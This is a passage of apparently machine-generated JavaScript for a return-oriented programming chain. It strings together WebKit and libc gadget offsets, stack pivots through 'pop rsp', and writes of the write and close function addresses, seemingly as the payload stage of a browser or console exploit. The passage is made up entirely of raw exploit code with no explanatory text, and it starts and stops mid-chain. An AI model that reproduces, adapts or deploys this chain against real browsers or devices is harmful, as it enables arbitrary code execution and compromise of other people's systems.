webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1166336, //L2859
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2859:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2860:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1166448, //L2862
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2861:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L2862:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1166536, //L2864
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1166552, //L2865
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2864:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2865:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1166712, //L2868
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1166744, //L2870
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1166696, //L2867
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1166728, //L2869
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2867:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2869:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2870:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1166872, //L2872
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1166888, //L2873
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1166856, //L2871
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2871:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2872:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1167048, //L2875
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1167064, //L2876
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1167032, //L2874
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2874:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2875:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2876:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1167184, //L2879
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1167152, //L2877
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2877:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2878:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+763368,); //pop rcx
//L2879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1167248, //L2882
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+782311, //pop rsp
ropchain+1167288, //L2881
//L2741:
libc_base+782311, //pop rsp
ropchain+1167304, //L2816
//L2881:
libc_base+782311, //pop rsp
ropchain+1161160, //L2726
//L2816:
libc_base+764760, //pop rsi
ropchain+1167360, //L2885
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2884:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+763368,); //pop rcx
//L2885:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1167448, //L2887
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1167464, //L2888
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2887:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2888:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1167624, //L2891
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1167656, //L2893
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1167608, //L2890
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1167640, //L2892
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2890:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2891:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2892:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2893:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1167752, //L2895
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1167736, //L2894
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2894:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2895:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2897:
ropchain+1167856, //L2896
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1169864, //L2898
//L2896:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1167944, //L2900
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2899:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2901:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1168064, //L2902
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1168080, //L2903
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2902:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2903:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1168200, //L2904
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1168184, //L2905
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2905:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1168288, //L2907
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1168272, //L2906
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2906:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1168392, //L2908
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1168408, //L2909
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2908:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1168528, //L2910
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1168512, //L2911
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2911:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2910:
db([0, 0]); // 0x0
//L2784:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
write_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1169856, //L2912
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2912:
db([0, 0]); // 0x0
//L2898:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
close_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1171184, //L2913
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2913:
db([0, 0]); // 0x0
//L2636:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
